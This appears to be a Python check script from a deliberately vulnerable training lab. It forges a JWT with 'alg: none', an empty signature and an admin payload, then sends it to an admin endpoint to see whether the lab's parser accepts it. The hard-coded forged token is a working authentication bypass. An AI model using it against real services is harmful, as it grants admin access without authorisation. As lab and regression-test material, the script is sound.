"""LAB 21 (A08 — Software and Data Integrity Failures): JWT alg:none.

Exploit: craft a token whose header declares `alg: none` and whose signature
is empty, with an admin payload. A parser that never looks at `alg` and
never verifies the signature accepts it — so the attacker is admin without
any key at all.

After the fix the token is parsed with a real library that pins the
algorithm and verifies the signature, so the same token is rejected.
"""

from common import Client, Result, Verdict

ID = 21
TITLE = "JWT alg:none — forge an admin token with no key at all"
ENDPOINT = "any authenticated endpoint (the admin API proves it best)"
AFFECTED = "backend/src/main/java/com/securebank/security/LabJwtService.java -> parse(String)"

# An unsecured token: alg=none, an empty signature, an admin payload.
UNSECURED_ADMIN_TOKEN = (
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"
    ".eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0"
    "."
)


def run(ctx: Client) -> Result:
    r = ctx.get("/api/admin/users", token=UNSECURED_ADMIN_TOKEN)

    if r.status_code == 200:
        try:
            users = r.json()
        except ValueError:
            users = None
        count = len(users) if isinstance(users, list) else "?"
        return Result(
            Verdict.VULNERABLE,
            f"an unsecured (alg:none) token was accepted as admin "
            f"({count} users returned) — no key was needed",
        )

    if r.status_code in (401, 403):
        return Result(
            Verdict.FIXED,
            f"the unsecured token was rejected (HTTP {r.status_code}) — the parser "
            "checks the algorithm and verifies the signature",
        )

    return Result(
        Verdict.INCONCLUSIVE,
        f"unexpected HTTP {r.status_code}: {r.text[:200]}",
    )
